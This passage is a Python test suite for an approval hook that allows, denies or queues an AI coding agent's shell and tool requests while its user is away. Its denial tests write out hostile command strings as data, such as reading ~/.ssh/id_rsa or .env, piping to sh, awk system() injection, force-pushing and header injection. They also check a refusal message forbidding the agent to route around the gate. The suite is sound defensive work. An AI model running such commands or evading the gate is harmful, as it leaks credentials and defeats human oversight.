#!/usr/bin/env python3
"""Exact coordinator grants and unattended denials; all fixtures are synthetic."""
import contextlib
import datetime as dt
import importlib.util
import io
import json
import os
from pathlib import Path
import subprocess
import tempfile
import unittest
from unittest import mock

REPO = Path(__file__).resolve().parents[5]
ENGINE = REPO / 'all/.local/lib/dotcortex/claude_approval_kikin.py'
READER = REPO / 'all/.local/bin/approval-morning-queue'
SPEC = importlib.util.spec_from_file_location('unattended_engine', ENGINE)
e = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(e)
NAMES = ('mail_send', 'worktree', 'integrate', 'commit', 'codex_dispatch', 'scratch_scp')
# Test watchdog only; engine, transport and lock deadlines stay unchanged.
SUBPROCESS_TIMEOUT = 30



class UnattendedCoordinatorTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(prefix='approval-unattended.')
        self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name)
        self.repo = self.base / 'DotCortex'
        self.repo.mkdir()
        self.wt = self.base / 'DotCortex-wt-test'
        self.wt.mkdir()
        self.scratch = self.base / 'scratch'
        self.scratch.mkdir()
        self.prompt = self.scratch / 'prompt.txt'
        self.prompt.write_text('synthetic work')
        self.message = self.scratch / 'message.txt'
        self.message.write_text('test: synthetic')
        os.chmod(self.message, 0o600)
        self.log = self.scratch / 'worker.log'
        self.flag = self.base / 'away'
        self.stamp = self.base / 'last-seen'
        self.stamp.touch()
        self.queue = self.base / 'queue.jsonl'
        self.ledger = self.base / 'ledger.jsonl'
        self.git('init', '-b', 'master')
        self.git('config', 'user.name', 'YOUR_TEST_USER')
        self.git('config', 'user.email', 'YOUR_USER@YOUR_HOST.helm')
        (self.repo / 'README.org').write_text('synthetic')
        self.git('add', '--', 'README.org')
        self.git('commit', '-m', 'test: fixture', '--', 'README.org')
        self.git('branch', 'topic')
        self.manifest = json.loads((REPO / 'all/.config/dotcortex/claude-approval-canary.kikin.v1.json').read_text())
        self.manifest['gate_inversion'] = {'enabled': False, 'present_refusal': 'deny'}
        self.manifest['roots'] = [str(self.repo), str(self.wt)]
        self.manifest['scratch_roots'] = [str(self.scratch)]
        self.manifest['decider']['enabled'] = False
        for entry in self.manifest['classes']:
            entry['enabled'] = False
        self.manifest['coordinator_ops'] = {
            'classes': {name: True for name in NAMES},
            'seat_account': 'YOUR_SEAT@YOUR_HOST.helm',
            'repo_roots': [str(self.repo)],
            'worktree_roots': [str(self.wt)],
            'scratch_roots': [str(self.scratch)],
            'build_host': 'YOUR_BUILD_HOST',
            'remote_scratch_roots': ['/tmp/YOUR_SEAT'],
            'remote_scratch_prefixes': ['YOUR_SEAT-'],
        }
        self.manifest['unattended'] = {
            'enabled': True, 'away_flag': str(self.flag),
            'presence_file': str(self.stamp), 'presence_window_minutes': 10,
            'quiet_hours': {'enabled': False, 'start': '23:00', 'end': '08:00', 'timezone': 'Australia/Melbourne'},
        }
        self.path = self.base / 'manifest.json'

    def git(self, *args):
        return subprocess.run(['git', '-C', str(self.repo), *args], stdin=subprocess.DEVNULL,
                              capture_output=True, text=True, timeout=SUBPROCESS_TIMEOUT, check=True).stdout.strip()

    def event(self, command, **extra):
        return {'hook_event_name': 'PermissionRequest', 'tool_name': 'Bash',
                'tool_input': {'command': command}, 'cwd': str(self.repo),
                'session_id': 'YOUR_SESSION', **extra}

    def loaded(self):
        self.path.write_text(json.dumps(self.manifest))
        with mock.patch.dict(os.environ, {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path)}):
            return e._load_manifest()

    def run_hook(self, command, **extra):
        self.path.write_text(json.dumps(self.manifest))
        env = {**os.environ, 'SO_APPROVAL_KIKIN_MANIFEST': str(self.path),
               'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        p = subprocess.run(['/usr/bin/python3', str(ENGINE)], input=json.dumps(self.event(command, **extra)),
                           env=env, capture_output=True, text=True, timeout=SUBPROCESS_TIMEOUT, check=True)
        return json.loads(p.stdout)['hookSpecificOutput']['decision'] if p.stdout.strip() else {'behavior': 'ask'}

    def allow(self, command):
        result = e.classify(self.event(command), self.loaded())
        self.assertTrue(result[0], (command, result))
        self.assertTrue(result[1].startswith('coordinator_'), result)

    def ask(self, command):
        self.assertEqual(self.run_hook(command)['behavior'], 'deny', command)

    def mail(self):
        return f'mailcortex send --from YOUR_SEAT@YOUR_HOST.helm --to YOUR_REVIEWER@YOUR_HOST.helm --subject "review ready" --body-file {self.prompt}'

    def dispatch(self):
        return f'nohup codex exec --model YOUR_MODEL --approve-for-me --skip-git-repo-check "$(cat {self.prompt})" < /dev/null > {self.log} 2>&1 &'

    def remote_dispatch(self):
        return "ssh -o BatchMode=yes -o ConnectTimeout=3 YOUR_BUILD_HOST 'nohup codex exec --model YOUR_MODEL --approve-for-me --skip-git-repo-check \"$(cat /tmp/YOUR_SEAT/prompt.txt)\" < /dev/null > /tmp/YOUR_SEAT/worker.log 2>&1 &'"

    def test_away_ask_denies_and_queues_full_request(self):
        self.flag.touch()
        decision = self.run_hook('unknown-command --argument')
        self.assertEqual(decision['behavior'], 'deny')
        self.assertIs(decision['interrupt'], False)
        self.assertIn('deferred: queued', decision['message'])
        self.assertIn('never retry, rephrase or route around this refusal', decision['message'])
        record = json.loads(self.queue.read_text())
        self.assertEqual(record['tool'], 'Bash')
        self.assertEqual(record['command'], 'unknown-command --argument')
        self.assertEqual(record['cwd'], str(self.repo))
        self.assertEqual(record['session'], 'YOUR_SESSION')
        self.assertEqual(record['request'], self.event('unknown-command --argument'))
        self.assertIn('timestamp', record)
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)
        self.assertEqual(json.loads(self.ledger.read_text())['decision'], 'deny')

    def test_away_floor_denies_and_queues(self):
        self.flag.touch()
        self.assertEqual(self.run_hook('rm -rf /tmp/YOUR_TEST')['behavior'], 'deny')
        self.assertEqual(json.loads(self.queue.read_text())['reason'], 'true_floor')

    def test_present_refusal_is_queued_without_terminal_prompt(self):
        self.ask('unknown-command')
        self.assertEqual(json.loads(self.queue.read_text())['command'], 'unknown-command')

    def test_away_does_not_change_class_allow(self):
        self.flag.touch()
        self.assertEqual(self.run_hook(self.mail())['behavior'], 'allow')
        self.assertFalse(self.queue.exists())

    def test_quiet_hours_boundaries_timezone_and_flag_or(self):
        self.manifest['unattended']['quiet_hours']['enabled'] = True
        self.stamp.unlink()
        manifest = self.loaded()
        for hour, minute in [(22, 59), (23, 0), (7, 59), (8, 0)]:
            with self.subTest(hour=hour, minute=minute):
                # January UTC +11: these values are Melbourne-local.
                instant = dt.datetime(2026, 1, 2, hour, minute, tzinfo=dt.timezone(dt.timedelta(hours=11)))
                self.assertEqual(e._away_status(manifest, now=instant), (True, 'away'))
        self.flag.touch()
        self.assertTrue(e._away_status(manifest, now=dt.datetime(2026, 1, 2, 12, tzinfo=dt.timezone(dt.timedelta(hours=11))))[0])

    def test_quiet_hours_day_window_and_dst(self):
        q = self.manifest['unattended']['quiet_hours']
        q.update(enabled=True, start='09:00', end='17:00')
        self.stamp.unlink()
        m = self.loaded()
        for utc in [dt.datetime(2026, 7, 1, 0, tzinfo=dt.timezone.utc),
                    dt.datetime(2026, 7, 1, 7, tzinfo=dt.timezone.utc)]:
            self.assertEqual(e._away_status(m, now=utc), (True, 'away'))

    def test_queue_symlink_failure_still_denies(self):
        self.flag.touch()
        victim = self.base / 'victim.txt'
        victim.write_text('keep me')
        self.queue.symlink_to(victim)
        decision = self.run_hook('unknown-command')
        self.assertEqual(decision['behavior'], 'deny')
        self.assertIn('queue unavailable', decision['message'])
        self.assertEqual(victim.read_text(), 'keep me')

    def test_queue_existing_permissions_are_restricted(self):
        self.flag.touch()
        self.queue.touch(mode=0o644)
        self.run_hook('unknown-command')
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)

    def test_queue_reader_groups_and_clear(self):
        self.flag.touch()
        self.run_hook('unknown-command')
        self.run_hook('another-command', session_id='YOUR_SECOND_SESSION')
        env = {**os.environ, 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
        args = ['/usr/bin/python3', str(READER)]
        read = subprocess.run(args, env=env, text=True, capture_output=True, timeout=SUBPROCESS_TIMEOUT, check=True)
        self.assertIn('YOUR_SESSION', read.stdout)
        self.assertIn('YOUR_SECOND_SESSION', read.stdout)
        self.assertIn('unknown-command', read.stdout)
        self.assertEqual(len(self.queue.read_text().splitlines()), 2)
        subprocess.run(args + ['--clear'], env=env, capture_output=True, timeout=SUBPROCESS_TIMEOUT, check=True)
        self.assertEqual(self.queue.read_text(), '')
        self.assertEqual(self.queue.stat().st_mode & 0o777, 0o600)

    def test_coordinator_home_paths_keep_reviewed_boundary(self):
        root = '/home/YOUR_USER/DotCortex'
        path = root + '/README.org'
        self.assertEqual(e._coordinator_path(path, [root], exists=False), path)
        for outside in [root + '-other/README.org', '/home/YOUR_OTHER_USER/notes.md',
                        root + '/.env', root + '/../notes.md']:
            self.assertIsNone(e._coordinator_path(outside, [root], exists=False), outside)
        with mock.patch.object(e.os.path, 'realpath', return_value='/home/YOUR_OTHER_USER/notes.md'):
            self.assertIsNone(e._coordinator_path(path, [root], exists=False))

    def test_proven_worktree_home_root_keeps_other_homes_on_floor(self):
        manifest = self.loaded()
        root = '/home/YOUR_USER/DotCortex-wt-test'
        manifest['coordinator_ops']['worktree_roots'] = [root]
        payload = self.event(f'git worktree add {root}/worker -b worker master')
        self.assertTrue(e._true_floor(payload, manifest))
        self.assertFalse(e._true_floor(payload, manifest, 'coordinator_worktree'))
        for outside in [root + '-other', '/home/YOUR_OTHER_USER/DotCortex-wt-test']:
            bad = self.event(f'git worktree add {outside}/worker -b worker master')
            self.assertTrue(e._true_floor(bad, manifest, 'coordinator_worktree'))
        manifest['coordinator_ops']['classes']['worktree'] = False
        self.assertFalse(e.classify(payload, manifest)[0])

    def test_mail_help_exact_incident_is_deterministic(self):
        manifest = self.loaded()
        request = self.event('mailcortex send --help 2>&1 | head -25')
        request['tool_input']['description'] = 'Check mailcortex send usage'
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            self.assertEqual(e.classify(request, manifest), (True, 'coordinator_mail_help'))
            self.assertEqual(e._decide_request(request, manifest), (True, 'coordinator_mail_help'))
            judge.assert_not_called()

    def test_mail_help_documented_schema_only(self):
        # services-mailcortex.org build_parser: argparse -h/--help, no version action.
        paths = ['', 'provision', 'send', 'inbox', 'read', 'receipt', 'bbs', 'bbs alert',
                 'bbs alert post', 'bbs alert list', 'bbs alert current', 'bbs alert emit-reset']
        manifest = self.loaded()
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            for path in paths:
                for flag in ['--help', '-h']:
                    for suffix in ['', ' 2>&1 | head -25', ' | tail -n 4', ' | cut -c1-1500']:
                        command = ' '.join(part for part in ['mailcortex', path, flag] if part) + suffix
                        with self.subTest(command=command):
                            self.assertEqual(e.classify(self.event(command), manifest),
                                             (True, 'coordinator_mail_help'))
                            self.assertEqual(e._decide_request(self.event(command), manifest),
                                             (True, 'coordinator_mail_help'))
            judge.assert_not_called()

    def test_mail_workflow_own_seat_supported_shapes(self):
        self.manifest['classes'][0]['enabled'] = True
        self.manifest['coordinator_ops']['seat_account'] = 'your_seat@fixture-host.helm'
        manifest = self.loaded()
        commands = [
            ('mailcortex inbox your_seat@fixture-host.helm 2>&1 | head -25', 'local_read'),
            ('mailcortex read your_seat@fixture-host.helm fixture-message 2>&1 | cut -c1-1500', 'local_read'),
            ('mailcortex send --help 2>&1 | head -25', 'coordinator_mail_help'),
            (self.mail().replace('YOUR_SEAT@', 'your_seat@').replace('YOUR_HOST.helm', 'fixture-host.helm') +
             " --in-reply-to '<fixture-message@fixture-host.helm>' --print-id", 'coordinator_mail_send'),
            ("mailcortex receipt your_seat '<fixture-message@fixture-host.helm>' handling_completed",
             'coordinator_mail_receipt'),
        ]
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            for command, reason in commands:
                with self.subTest(command=command):
                    self.assertEqual(e.classify(self.event(command), manifest), (True, reason))
                    self.assertEqual(e._decide_request(self.event(command), manifest), (True, reason))
            judge.assert_not_called()

    def test_mail_help_and_receipt_do_not_erase_effects_or_owner_proof(self):
        self.manifest['coordinator_ops']['seat_account'] = 'your_seat@fixture-host.helm'
        manifest = self.loaded()
        help_command = 'mailcortex send --help'
        reply = self.mail().replace('YOUR_SEAT@', 'your_seat@').replace('YOUR_HOST.helm', 'fixture-host.helm')
        receipt = "mailcortex receipt your_seat '<fixture-message@fixture-host.helm>' handling_completed"
        denied = [
            'mailcortex unknown --help', 'mailcortex bbs unknown --help',
            'mailcortex --version', 'mailcortex send --version',
            'mailcortex send --help --from your_seat@fixture-host.helm',
            'mailcortex send --from your_seat@fixture-host.helm --help',
            'mailcortex send -- --help', 'mailcortex send --subject --help',
            'mailcortex send --subject=-h', 'mailcortex send --help=1',
            reply + ' --help', reply + ' -h',
            reply.replace('--subject "review ready"', '--subject --help').replace('your_seat@', 'other_seat@'),
            reply + " --in-reply-to 'invalid-id'", reply + " --in-reply-to '--help'",
            reply + " --in-reply-to '<a@b>' --in-reply-to '<c@d>'",
            reply + " --in-reply-to '<a@b>\nX-Injected: yes'",
            receipt.replace('your_seat ', 'other_seat '),
            receipt.replace('your_seat ', 'your_seat@fixture-host.helm '),
            receipt.replace('<fixture-message@fixture-host.helm>', 'fixture-message'),
            receipt.replace('<fixture-message@fixture-host.helm>', '--help'),
            receipt.replace('handling_completed', 'handling_failed'), receipt + ' --help',
            receipt + ' --output fixture-output',
        ]
        for base in [help_command, receipt]:
            denied += [base + suffix for suffix in [
                ' | awk \'BEGIN { system ("fixture-command") }\'',
                ' | awk \'BEGIN { system("fixture-command") }\'',
                ' | awk \'BEGIN { "fixture-command" | getline }\'',
                " | sed -n '1p'", ' | head fixture-input', ' | tail -f',
                ' | cut -c1-1500 fixture-input', ' | head -25 | sh',
                ' | head -25; fixture-command', ' | head -25 && fixture-command',
                '>/tmp/fixture-clobber', '>>/tmp/fixture-clobber', '</tmp/fixture-input',
                ' 2>/tmp/fixture-error', ' 2>&1>/tmp/fixture-clobber',
                ' | head -25>/tmp/fixture-clobber', ' | head -25 <fixture-input',
                ' $(fixture-command)', ' `fixture-command`', ' # fixture-comment',
                '; cat .env', ' && cat ~/.ssh/id_rsa', ' | sh',
            ]]
        for command in denied:
            with self.subTest(refused=command), \
                    mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
                self.assertFalse(e.classify(self.event(command), manifest)[0])
                self.assertFalse(e._decide_request(self.event(command), manifest)[0])
        for command in [help_command, receipt]:
            request = self.event(command)
            request['tool_input']['description'] = 'API_KEY=syntheticvalue'
            self.assertEqual(e._decide_request(request, manifest), (False, 'true_floor'))
            self.assertFalse(e._decide_request(self.event(command, cwd=str(self.base)), manifest)[0])
        manifest['coordinator_ops']['classes']['mail_send'] = False
        for command in [help_command, receipt]:
            self.assertFalse(e.classify(self.event(command), manifest)[0])
            self.assertFalse(e._decide_request(self.event(command), manifest)[0])

    def test_mail_exact_and_deviations(self):
        self.allow(self.mail())
        for bad in [self.mail().replace('YOUR_SEAT@', 'YOUR_OTHER@'),
                    self.mail().replace('YOUR_HOST.helm', 'example.invalid'),
                    self.mail().replace(str(self.prompt), str(self.base / 'outside.txt')),
                    self.mail() + ' --cc YOUR_OTHER@YOUR_HOST.helm',
                    self.mail() + '; rm README.org']:
            self.ask(bad)

    def mail_read_batch(self):
        return ('cd /tmp; for m in fixture-message-one fixture-message-two fixture-message-three; '
                'do echo "=========== $m"; mailcortex read YOUR_SEAT@YOUR_HOST.helm "$m" '
                '2>&1 | cut -c1-1500; done')

    def test_mail_read_batch_exact_incident_shape_is_deterministic(self):
        self.manifest['classes'][0]['enabled'] = True
        manifest = self.loaded()
        command = self.mail_read_batch()
        # Only classify strings: never invoke mail, change cwd, or expand a shell.
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no command execution')):
            self.assertEqual(e._decide_request(self.event(command), manifest),
                             (True, 'coordinator_mail_read_batch'))
            self.assertEqual(e.classify(self.event(command), manifest),
                             (True, 'coordinator_mail_read_batch'))
            judge.assert_not_called()

    def test_mail_read_batch_keeps_malicious_loops_secrets_writes_and_pipelines_refused(self):
        self.manifest['classes'][0]['enabled'] = True
        manifest = self.loaded()
        command = self.mail_read_batch()
        unsafe = [
            command.replace('YOUR_SEAT@', 'OTHER_SEAT@'),
            command.replace('fixture-message-one', '../.env'),
            command.replace('fixture-message-one', '$(cat .env)'),
            command.replace('fixture-message-one', '*'),
            command.replace('fixture-message-one', '--help'),
            command.replace('fixture-message-one', 'x' * 129),
            command.replace('fixture-message-one fixture-message-two fixture-message-three',
                            ' '.join('fixture-' + str(i) for i in range(33))),
            command.replace('cut -c1-1500', 'sh'),
            command.replace('cut -c1-1500', 'tee /tmp/fixture-output'),
            command.replace('cut -c1-1500', 'cut -c1-1500 .env'),
            command.replace('2>&1', '2>/tmp/fixture-error'),
            command.replace('mailcortex read', 'mailcortex send'),
            command.replace('echo "=========== $m"', 'cat ~/.ssh/id_rsa'),
            command.replace('; done', '; rm README.org; done'),
            command + '; git push --force origin master',
            command + ' > /tmp/fixture-output',
            command.replace('cd /tmp;', 'cd /;'),
            command.replace('cd /tmp;', 'cd /tmp; cat .env;'),
            'cd /tmp; cat .env',
            'cd /tmp; for m in fixture-message-one; do rm "$m"; done',
        ]
        with mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')):
            for bad in unsafe:
                with self.subTest(refused=bad):
                    self.assertFalse(e._decide_request(self.event(bad), manifest)[0])
        request = self.event(command)
        request['tool_input']['description'] = 'API_KEY=syntheticvalue'
        with mock.patch.object(e, '_decider_decide') as judge:
            self.assertEqual(e._decide_request(request, manifest), (False, 'true_floor'))
            judge.assert_not_called()
        self.manifest['classes'][0]['enabled'] = False
        self.assertFalse(e._decide_request(self.event(command), self.loaded())[0])

    def inline_mail(self, body='The fixture user asked for gate status. A read-only tabs call was deferred; notifier unconfigured. I have not retried. Please report when the gate and notifier are fixed.'):
        import shlex
        return ('mailcortex send --from your_seat@fixture-host.helm --to reviewer@fixture-host.helm '
                "--subject 'Approval gate still holding: fixture asks for status' --print-id --body "
                + shlex.quote(body) + ' 2>&1 | tail -5')

    def test_native_inline_body_status_mail_is_deterministic(self):
        self.manifest['coordinator_ops']['seat_account'] = 'your_seat@fixture-host.helm'
        manifest = self.loaded()
        bodies = ['The fixture user asked for gate status. A read-only tabs call was deferred; notifier unconfigured. I have not retried. Please report when the gate and notifier are fixed.',
                  'Quoted inert text: | > >> < 2>&1; café ✓', 'Literal single-quoted $label and `label`']
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no mail execution')):
            for body in bodies:
                command = self.inline_mail(body)
                with self.subTest(body=body):
                    self.assertEqual(e.classify(self.event(command), manifest), (True, 'coordinator_mail_send'))
                    self.assertEqual(e._decide_request(self.event(command), manifest), (True, 'coordinator_mail_send'))
                    self.assertEqual(e._coordinator_mail_fields(e._coordinator_mail_words(command),
                                     manifest['coordinator_ops'])['--body'], body)
            judge.assert_not_called()

    def test_inline_body_keeps_options_ownership_secrets_expansions_and_shell_effects_refused(self):
        self.manifest['coordinator_ops']['seat_account'] = 'your_seat@fixture-host.helm'
        manifest = self.loaded()
        base = self.inline_mail('fixture status')
        plain = base.removesuffix(' 2>&1 | tail -5')
        denied = [plain + ' --body duplicate', plain + f' --body-file {self.prompt}',
                  plain.replace('--body ', '--body-file '), plain.replace('your_seat@', 'other_seat@'),
                  plain.replace('reviewer@fixture-host.helm', 'reviewer@external.invalid'),
                  self.inline_mail('--help'), self.inline_mail('API_KEY=syntheticvalue'),
                  self.inline_mail('cat ~/.ssh/id_rsa'), self.inline_mail('x' * 16385),
                  plain.replace("'fixture status'", '$BODY'), plain.replace("'fixture status'", '$(fixture-command)'),
                  plain.replace("'fixture status'", '`fixture-command`'),
                  plain.replace("'fixture status'", '"$BODY"'),
                  plain + ' | sh', plain + ' | head fixture-input',
                  plain + ' | awk \'BEGIN { system ("fixture-command") }\'',
                  plain + f'>{self.scratch}/clobber', plain + ' 2>&1>/tmp/fixture-clobber',
                  plain + ' | tail -5>/tmp/fixture-clobber', plain + '; fixture-command',
                  plain + ' && fixture-command', plain + ' --cc other@fixture-host.helm',
                  plain + ' --subject duplicate', plain.replace('--body ', '--body --help ')]
        with mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            for command in denied:
                with self.subTest(command=command):
                    self.assertFalse(e.classify(self.event(command), manifest)[0])
                    self.assertFalse(e._decide_request(self.event(command), manifest)[0])
            self.assertFalse(e._decide_request(self.event(base, cwd=str(self.base)), manifest)[0])
            manifest['coordinator_ops']['classes']['mail_send'] = False
            self.assertFalse(e._decide_request(self.event(base), manifest)[0])

    def test_mail_inert_variants_are_deterministic_and_effects_stay_refused(self):
        variants = [
            self.mail() + ' --print-id',
            f'mailcortex send --subject "review ready" --body-file {self.prompt} '
            '--to YOUR_REVIEWER@YOUR_HOST.helm --from YOUR_SEAT@YOUR_HOST.helm',
            self.mail().replace('review ready', 'review ready — café ✓'),
            self.mail() + ' --print-id 2>&1 | tail -4',
        ]
        manifest = self.loaded()
        for command in variants:
            with self.subTest(command=command), mock.patch.object(e, '_decider_decide') as judge:
                self.assertEqual(e._decide_request(self.event(command), manifest),
                                 (True, 'coordinator_mail_send'))
                judge.assert_not_called()
        for command in [self.mail() + ' --cc YOUR_REVIEWER@YOUR_HOST.helm',
                        self.mail() + ' | sh', self.mail() + ' > output.txt',
                        self.mail() + '; rm README.org']:
            with self.subTest(refused=command):
                self.assertFalse(e.classify(self.event(command), manifest)[0], command)

    def test_mail_send_filters_are_small_stdin_grammar_local_and_remote(self):
        import shlex
        self.manifest['coordinator_ops']['peer_host'] = 'YOUR_PEER_HOST'
        manifest = self.loaded()
        remote = self.mail().replace(str(self.prompt), '/tmp/YOUR_SEAT/report.md')
        allowed = ['head', 'head -4', 'head -n 4', 'tail -4', 'tail -n 4', 'cut -c1-1500']
        denied = ["awk 'BEGIN { system (\"fixture-command\") }'",
                  "awk 'function f() { system (\"fixture-command\") } BEGIN { f() }'",
                  "awk 'BEGIN { print \"fixture\" }'", "awk '{print}' fixture-input",
                  "awk '{print | \"fixture-command\"}'",
                  "sed -n '1p'", 'head fixture-input', 'tail -f',
                  'cut -c1-1500 fixture-input', 'head -4 | sh']
        # Classification only: hostile programs are never passed to a shell.
        with mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')), \
                mock.patch.object(e, '_coordinator_remote_proof', return_value=True), \
                mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')):
            for filters, expected in [(allowed, True), (denied, False)]:
                for filt in filters:
                    for lane, command in [('local', self.mail() + ' | ' + filt),
                                          ('remote', 'ssh YOUR_PEER_HOST ' + shlex.quote(remote + ' | ' + filt))]:
                        with self.subTest(lane=lane, filter=filt):
                            self.assertEqual(e.classify(self.event(command), manifest)[0], expected)
                            self.assertEqual(e._decide_request(self.event(command), manifest)[0], expected)

    def test_mail_shell_operators_are_quote_aware_local_and_remote(self):
        import shlex
        self.manifest['coordinator_ops']['peer_host'] = 'YOUR_PEER_HOST'
        manifest = self.loaded()
        allowed = [self.mail(), self.mail() + ' 2>&1', self.mail() + ' 2>&1 | tail -4',
                   self.mail().replace('review ready', 'review > literal >> < 3>&1'),
                   self.mail().replace('review ready', 'review | tail -4'),
                   self.mail().replace('review ready', 'review 2>&1')]
        denied = [self.mail().replace('"review ready"', 'review' + op + str(self.scratch / 'clobber'))
                  for op in ['>', '>>', '<', '2>', '3>>', '0<', '>&', '<>']]
        denied += [self.mail() + suffix for suffix in [
            '>/tmp/fixture-clobber', '>>/etc/fixture-clobber', '</tmp/fixture-input',
            ' 3>&1', ' 2>&1>/tmp/fixture-clobber', ' | tail -4>/tmp/fixture-clobber',
            '; fixture-command', ' && fixture-command', ' & fixture-command',
            ' | tail -4; fixture-command', ' $(fixture-command)', ' `fixture-command`']]
        with mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')), \
                mock.patch.object(e, '_coordinator_remote_proof', return_value=True), \
                mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 0, 'allow')):
            for commands, expected in [(allowed, True), (denied, False)]:
                for local in commands:
                    remote = local.replace(str(self.prompt), '/tmp/YOUR_SEAT/report.md')
                    for lane, command in [('local', local), ('remote', 'ssh YOUR_PEER_HOST ' + shlex.quote(remote))]:
                        with self.subTest(lane=lane, command=command):
                            self.assertEqual(e.classify(self.event(command), manifest)[0], expected)
                            self.assertEqual(e._decide_request(self.event(command), manifest)[0], expected)

    def test_inert_description_is_not_a_secret_path_but_credentials_still_floor(self):
        manifest = self.loaded()
        request = self.event(self.mail())
        request['tool_input']['description'] = 'Send approved task after token check'
        with mock.patch.object(e, '_decider_decide') as judge:
            self.assertEqual(e._decide_request(request, manifest), (True, 'coordinator_mail_send'))
            judge.assert_not_called()
        request['tool_input']['description'] = 'API_KEY=syntheticvalue'
        with mock.patch.object(e, '_decider_decide') as judge:
            self.assertEqual(e._decide_request(request, manifest), (False, 'true_floor'))
            judge.assert_not_called()

    def test_routine_matrix_keeps_attachment_owner_gate_and_all_other_steps(self):
        # One session/manifest; DOWNLOAD deliberately remains blocked pending
        # the external trusted producer fix. Read fixture is owner-produced,
        # not evidence that a download succeeded.
        inbox = self.base / '.claude/channels/telegram-fixture/inbox'
        inbox.mkdir(parents=True)
        artifact = inbox / '1790000000000-SyntheticUnique.md'
        artifact.write_text('synthetic routing fixture')
        self.manifest['roots'].append(str(inbox))
        self.manifest['classes'][0]['enabled'] = True
        self.manifest['coordinator_ops']['seat_account'] = 'your_seat@fixture-host.helm'
        manifest = self.loaded()
        file_mail = self.mail().replace('YOUR_SEAT@', 'your_seat@').replace('YOUR_HOST.helm', 'fixture-host.helm')
        inline = self.inline_mail().replace('YOUR_SEAT@', 'your_seat@').replace('YOUR_HOST.helm', 'fixture-host.helm')
        cases = [
            ('download_blocked_owner', self.event('true', tool_name='mcp__plugin_telegram_telegram__download_attachment',
                                                tool_input={'file_id': 'SyntheticAttachment_123'}), False),
            ('owner_fixture_read', self.event('true', tool_name='Read', tool_input={'file_path': str(artifact)}), True),
            ('tabs', self.event('true', tool_name='mcp__agentify__agentify_tabs', tool_input={}), True),
            ('inline_mail', self.event(inline), True), ('file_mail', self.event(file_mail), True),
            ('inbox', self.event('mailcortex inbox your_seat@fixture-host.helm 2>&1 | head -25'), True),
            ('body', self.event('mailcortex read your_seat@fixture-host.helm fixture-message 2>&1 | cut -c1-1500'), True),
            ('help', self.event('mailcortex send --help 2>&1 | head -25'), True),
            ('reply', self.event(file_mail + " --in-reply-to '<fixture-message@fixture-host.helm>' --print-id"), True),
            ('receipt', self.event("mailcortex receipt your_seat '<fixture-message@fixture-host.helm>' handling_completed"), True),
        ]
        with mock.patch.object(e, '_decider_decide') as judge, \
                mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no execution')):
            for label, request, expected in cases:
                with self.subTest(step=label):
                    self.assertEqual(e.classify(request, manifest)[0], expected)
                    self.assertEqual(e._decide_request(request, manifest)[0], expected)
            judge.assert_not_called()

    def test_telegram_unproven_downloads_stay_denied_without_trusted_owner(self):
        # Installed plugin has no per-inbound-ID authorization or exclusive
        # output creation. Never turn a caller-supplied ID/meta into authority.
        manifest = self.loaded()
        payloads = [{'file_id': 'SyntheticAttachment_123'},
                    {'file_id': 'SyntheticAttachment_123', 'path': '/tmp/fixture'},
                    {'file_id': 'SyntheticAttachment_123', 'url': 'https://fixture.invalid'},
                    {'file_id': 'SyntheticAttachment_123', 'authorized': True},
                    {}, {'file_id': None}, {'file_id': []}, {'file_id': 1},
                    {'file_id': '../.env'}, {'file_id': 'https://fixture.invalid'},
                    {'file_id': 'API_KEY=syntheticvalue'}, {'file_id': 'x' * 4097},
                    {'file_id': 'fixture\nnext'}, {'file_id': '$(fixture-command)'}]
        with mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no download execution')):
            for payload in payloads:
                with self.subTest(payload=payload):
                    request = self.event('true', tool_name='mcp__plugin_telegram_telegram__download_attachment',
                                         tool_input=payload)
                    self.assertFalse(e.classify(request, manifest)[0])
                    self.assertFalse(e._decide_request(request, manifest)[0])

    def test_existing_read_gate_supports_owner_scoped_inbox_not_channel_state(self):
        # This proves only the Read half with an explicitly configured inbox
        # root and owner-produced fixture. It does NOT assert a download grant.
        state = self.base / '.claude/channels/telegram-fixture'
        inbox = state / 'inbox'
        inbox.mkdir(parents=True)
        artifact = inbox / '1790000000000-SyntheticUnique.md'
        artifact.write_text('synthetic attachment routing fixture')
        neighbor = state / 'access.json'
        neighbor.write_text('{}')
        secret = state / '.env'
        secret.write_text('synthetic credential fixture')
        self.manifest['roots'].append(str(inbox))
        self.manifest['classes'][0]['enabled'] = True
        manifest = self.loaded()
        def request(path, tool='Read'):
            return self.event('true', tool_name=tool, tool_input={'file_path': str(path)})
        with mock.patch.object(e.subprocess, 'run', side_effect=AssertionError('no tool execution')):
            self.assertTrue(e.classify(request(artifact), manifest)[0])
            self.assertTrue(e._decide_request(request(artifact), manifest)[0])
            escape = inbox / 'escape.md'
            escape.symlink_to(neighbor)
            token_link = inbox / 'fixture-link.md'
            token_link.symlink_to(secret)
            for path in [neighbor, secret, state / 'bot.pid', state / 'token.txt',
                         inbox / '../access.json', escape, token_link]:
